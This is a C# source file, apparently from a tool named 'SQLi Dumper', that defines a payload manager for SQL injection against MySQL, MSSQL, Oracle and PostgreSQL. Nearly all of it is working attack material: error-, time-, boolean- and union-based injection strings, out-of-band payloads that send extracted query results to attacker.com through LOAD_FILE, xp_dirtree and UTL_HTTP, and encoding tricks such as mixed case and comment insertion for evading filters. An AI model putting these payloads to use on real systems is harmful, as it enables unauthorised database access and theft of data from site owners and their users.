using System;
using System.Collections.Generic;
using System.Linq;
using DataBase;

namespace SQLi_Dumper
{
    /// <summary>
    /// Centralized payload management system for SQL injection testing
    /// </summary>
    public class PayloadManager
    {
        private static PayloadManager _instance;
        private readonly Dictionary<PayloadCategory, Dictionary<Types, List<string>>> _payloads;
        private readonly Dictionary<string, List<string>> _encodingMethods;

        public static PayloadManager Instance
        {
            get
            {
                if (_instance == null)
                    _instance = new PayloadManager();
                return _instance;
            }
        }

        private PayloadManager()
        {
            _payloads = new Dictionary<PayloadCategory, Dictionary<Types, List<string>>>();
            _encodingMethods = new Dictionary<string, List<string>>();
            InitializePayloads();
            InitializeEncodingMethods();
        }

        public enum PayloadCategory
        {
            ErrorBased,
            TimeBased,
            BooleanBased,
            UnionBased,
            OutOfBand
        }

        /// <summary>
        /// Gets payloads for a specific category and database type
        /// </summary>
        public List<string> GetPayloads(PayloadCategory category, Types dbType)
        {
            if (_payloads.ContainsKey(category) && _payloads[category].ContainsKey(dbType))
                return new List<string>(_payloads[category][dbType]);
            return new List<string>();
        }

        /// <summary>
        /// Gets all payloads for a specific category across all database types
        /// </summary>
        public List<string> GetAllPayloads(PayloadCategory category)
        {
            var allPayloads = new List<string>();
            if (_payloads.ContainsKey(category))
            {
                foreach (var dbPayloads in _payloads[category].Values)
                {
                    allPayloads.AddRange(dbPayloads);
                }
            }
            return allPayloads.Distinct().ToList();
        }

        /// <summary>
        /// Adds a custom payload to the system
        /// </summary>
        public void AddPayload(PayloadCategory category, Types dbType, string payload)
        {
            if (!_payloads.ContainsKey(category))
                _payloads[category] = new Dictionary<Types, List<string>>();

            if (!_payloads[category].ContainsKey(dbType))
                _payloads[category][dbType] = new List<string>();

            if (!_payloads[category][dbType].Contains(payload))
                _payloads[category][dbType].Add(payload);
        }

        /// <summary>
        /// Applies encoding to a payload
        /// </summary>
        public string EncodePayload(string payload, string encodingType)
        {
            if (!_encodingMethods.ContainsKey(encodingType))
                return payload;

            // Apply encoding transformations
            string encoded = payload;
            foreach (var method in _encodingMethods[encodingType])
            {
                encoded = ApplyEncodingMethod(encoded, method);
            }
            return encoded;
        }

        private void InitializePayloads()
        {
            InitializeErrorBasedPayloads();
            InitializeTimeBasedPayloads();
            InitializeBooleanBasedPayloads();
            InitializeUnionBasedPayloads();
            InitializeOutOfBandPayloads();
        }

        private void InitializeErrorBasedPayloads()
        {
            var errorPayloads = new Dictionary<Types, List<string>>();

            // MySQL Error-based payloads
            errorPayloads[Types.MySQL_With_Error] = new List<string>
            {
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(([t]),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND 'x'='x",
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, ([t]), 0x7e)) AND 'x'='x",
                "' AND UPDATEXML(1, CONCAT(0x7e, ([t]), 0x7e), 1) AND 'x'='x",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(0x7e,([t]),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND 'x'='x",
                "' AND GTID_SUBSET(CONCAT(0x7e,([t]),0x7e),1) AND 'x'='x",
                "' AND JSON_KEYS((SELECT CONCAT(0x7e,([t]),0x7e))) AND 'x'='x"
            };

            // MSSQL Error-based payloads
            errorPayloads[Types.MSSQL_With_Error] = new List<string>
            {
                "' AND CONVERT(int, ([t])) AND 'x'='x",
                "' AND CAST(([t]) AS int) AND 'x'='x",
                "' AND 1=CONVERT(int, ([t])) AND 'x'='x",
                "' AND 1=CAST(([t]) AS int) AND 'x'='x",
                "' AND 1=(SELECT CONVERT(int, ([t]))) AND 'x'='x"
            };

            // Oracle Error-based payloads
            errorPayloads[Types.Oracle_With_Error] = new List<string>
            {
                "' AND CTXSYS.DRITHSX.SN(1,([t])) IS NULL AND 'x'='x",
                "' AND XMLType(CHR(60)||CHR(58)||([t])||CHR(62)) IS NOT NULL AND 'x'='x",
                "' AND EXTRACTVALUE(XMLType(CHR(60)||CHR(58)||([t])||CHR(62)),CHR(47)) IS NOT NULL AND 'x'='x",
                "' AND UTL_INADDR.GET_HOST_ADDRESS(([t])) IS NULL AND 'x'='x"
            };

            // PostgreSQL Error-based payloads
            errorPayloads[Types.PostgreSQL_With_Error] = new List<string>
            {
                "' AND CAST(([t]) AS integer) IS NOT NULL AND 'x'='x",
                "' AND 1=CAST(([t]) AS integer) AND 'x'='x",
                "' AND ([t])::int IS NOT NULL AND 'x'='x",
                "' AND 1=([t])::int AND 'x'='x"
            };

            _payloads[PayloadCategory.ErrorBased] = errorPayloads;
        }

        private void InitializeTimeBasedPayloads()
        {
            var timePayloads = new Dictionary<Types, List<string>>();

            // MySQL Time-based payloads
            timePayloads[Types.MySQL_No_Error] = new List<string>
            {
                "' AND IF(([t]), SLEEP(5), 0) AND 'x'='x",
                "' AND (SELECT IF(([t]), SLEEP(5), 0)) AND 'x'='x",
                "' AND IF(LENGTH(([t]))>0, SLEEP(5), 0) AND 'x'='x",
                "' AND IF(ASCII(SUBSTRING(([t]),1,1))>64, SLEEP(5), 0) AND 'x'='x",
                "' AND BENCHMARK(5000000,MD5(([t]))) AND 'x'='x"
            };

            // MSSQL Time-based payloads
            timePayloads[Types.MSSQL_No_Error] = new List<string>
            {
                "' AND IF(([t]), WAITFOR DELAY '00:00:05', 0) AND 'x'='x",
                "'; IF(([t])) WAITFOR DELAY '00:00:05' --",
                "' AND (SELECT CASE WHEN ([t]) THEN 1 ELSE 0 END) AND WAITFOR DELAY '00:00:05' AND 'x'='x"
            };

            // Oracle Time-based payloads
            timePayloads[Types.Oracle_No_Error] = new List<string>
            {
                "' AND (SELECT CASE WHEN ([t]) THEN DBMS_LOCK.SLEEP(5) ELSE 0 END FROM DUAL) IS NOT NULL AND 'x'='x",
                "' AND DECODE(([t]), 1, DBMS_LOCK.SLEEP(5), 0) IS NOT NULL AND 'x'='x"
            };

            // PostgreSQL Time-based payloads
            timePayloads[Types.PostgreSQL_No_Error] = new List<string>
            {
                "' AND (SELECT CASE WHEN ([t]) THEN pg_sleep(5) ELSE 0 END) IS NOT NULL AND 'x'='x",
                "' AND (SELECT pg_sleep(5) WHERE ([t])) IS NOT NULL AND 'x'='x"
            };

            _payloads[PayloadCategory.TimeBased] = timePayloads;
        }

        private void InitializeBooleanBasedPayloads()
        {
            var booleanPayloads = new Dictionary<Types, List<string>>();

            // MySQL Boolean-based payloads
            booleanPayloads[Types.MySQL_No_Error] = new List<string>
            {
                "' AND ([t]) AND 'x'='x",
                "' AND ASCII(SUBSTRING(([t]),1,1))>64 AND 'x'='x",
                "' AND LENGTH(([t]))>0 AND 'x'='x",
                "' AND SUBSTRING(([t]),1,1)='A' AND 'x'='x",
                "' AND ([t]) LIKE 'A%' AND 'x'='x"
            };

            // MSSQL Boolean-based payloads
            booleanPayloads[Types.MSSQL_No_Error] = new List<string>
            {
                "' AND ([t]) AND 'x'='x",
                "' AND ASCII(SUBSTRING(([t]),1,1))>64 AND 'x'='x",
                "' AND LEN(([t]))>0 AND 'x'='x",
                "' AND SUBSTRING(([t]),1,1)='A' AND 'x'='x",
                "' AND ([t]) LIKE 'A%' AND 'x'='x"
            };

            // Oracle Boolean-based payloads
            booleanPayloads[Types.Oracle_No_Error] = new List<string>
            {
                "' AND ([t]) IS NOT NULL AND 'x'='x",
                "' AND ASCII(SUBSTR(([t]),1,1))>64 AND 'x'='x",
                "' AND LENGTH(([t]))>0 AND 'x'='x",
                "' AND SUBSTR(([t]),1,1)='A' AND 'x'='x",
                "' AND ([t]) LIKE 'A%' AND 'x'='x"
            };

            // PostgreSQL Boolean-based payloads
            booleanPayloads[Types.PostgreSQL_No_Error] = new List<string>
            {
                "' AND ([t]) IS NOT NULL AND 'x'='x",
                "' AND ASCII(SUBSTRING(([t]),1,1))>64 AND 'x'='x",
                "' AND LENGTH(([t]))>0 AND 'x'='x",
                "' AND SUBSTRING(([t]),1,1)='A' AND 'x'='x",
                "' AND ([t]) LIKE 'A%' AND 'x'='x"
            };

            _payloads[PayloadCategory.BooleanBased] = booleanPayloads;
        }

        private void InitializeUnionBasedPayloads()
        {
            var unionPayloads = new Dictionary<Types, List<string>>();

            // Generic Union-based payloads (work across multiple databases)
            var genericUnionPayloads = new List<string>
            {
                "' UNION SELECT [t] --",
                "' UNION ALL SELECT [t] --",
                "' UNION SELECT [t] FROM dual --",
                "' UNION ALL SELECT [t] FROM dual --",
                "' UNION SELECT [t] #",
                "' UNION ALL SELECT [t] #",
                "' UNION SELECT [t]/*",
                "' UNION ALL SELECT [t]/*",
                "' UNION SELECT [t];%00",
                "' UNION ALL SELECT [t];%00"
            };

            unionPayloads[Types.MySQL_No_Error] = new List<string>(genericUnionPayloads);
            unionPayloads[Types.MSSQL_No_Error] = new List<string>(genericUnionPayloads);
            unionPayloads[Types.Oracle_No_Error] = new List<string>(genericUnionPayloads);
            unionPayloads[Types.PostgreSQL_No_Error] = new List<string>(genericUnionPayloads);

            _payloads[PayloadCategory.UnionBased] = unionPayloads;
        }

        private void InitializeOutOfBandPayloads()
        {
            var oobPayloads = new Dictionary<Types, List<string>>();

            // MySQL Out-of-band payloads
            oobPayloads[Types.MySQL_No_Error] = new List<string>
            {
                "' AND LOAD_FILE(CONCAT('\\\\\\\\',([t]),'.attacker.com\\\\file.txt')) AND 'x'='x"
            };

            // MSSQL Out-of-band payloads
            oobPayloads[Types.MSSQL_No_Error] = new List<string>
            {
                "'; EXEC master..xp_dirtree CONCAT('\\\\\\\\',([t]),'.attacker.com\\\\file.txt') --"
            };

            // Oracle Out-of-band payloads
            oobPayloads[Types.Oracle_No_Error] = new List<string>
            {
                "' AND UTL_HTTP.REQUEST('http://attacker.com/'||([t])) IS NOT NULL AND 'x'='x",
                "' AND HTTPURITYPE('http://attacker.com/'||([t])).getclob() IS NOT NULL AND 'x'='x"
            };

            _payloads[PayloadCategory.OutOfBand] = oobPayloads;
        }

        private void InitializeEncodingMethods()
        {
            _encodingMethods["url"] = new List<string> { "url_encode" };
            _encodingMethods["double_url"] = new List<string> { "url_encode", "url_encode" };
            _encodingMethods["hex"] = new List<string> { "hex_encode" };
            _encodingMethods["base64"] = new List<string> { "base64_encode" };
            _encodingMethods["unicode"] = new List<string> { "unicode_encode" };
            _encodingMethods["html"] = new List<string> { "html_encode" };
            _encodingMethods["mixed_case"] = new List<string> { "mixed_case" };
            _encodingMethods["comment_injection"] = new List<string> { "comment_injection" };
        }

        private string ApplyEncodingMethod(string payload, string method)
        {
            switch (method)
            {
                case "url_encode":
                    return System.Web.HttpUtility.UrlEncode(payload);
                case "hex_encode":
                    return "0x" + BitConverter.ToString(System.Text.Encoding.ASCII.GetBytes(payload)).Replace("-", "");
                case "base64_encode":
                    return Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(payload));
                case "unicode_encode":
                    return string.Join("", payload.Select(c => "\\u" + ((int)c).ToString("x4")));
                case "html_encode":
                    return System.Web.HttpUtility.HtmlEncode(payload);
                case "mixed_case":
                    return ApplyMixedCase(payload);
                case "comment_injection":
                    return ApplyCommentInjection(payload);
                default:
                    return payload;
            }
        }

        private string ApplyMixedCase(string payload)
        {
            var result = new System.Text.StringBuilder();
            bool upperCase = false;
            foreach (char c in payload)
            {
                if (char.IsLetter(c))
                {
                    result.Append(upperCase ? char.ToUpper(c) : char.ToLower(c));
                    upperCase = !upperCase;
                }
                else
                {
                    result.Append(c);
                }
            }
            return result.ToString();
        }

        private string ApplyCommentInjection(string payload)
        {
            return payload.Replace(" ", "/**/ ")
                         .Replace("AND", "/**/AND/**/")
                         .Replace("OR", "/**/OR/**/")
                         .Replace("UNION", "/**/UNION/**/")
                         .Replace("SELECT", "/**/SELECT/**/");
        }
    }
}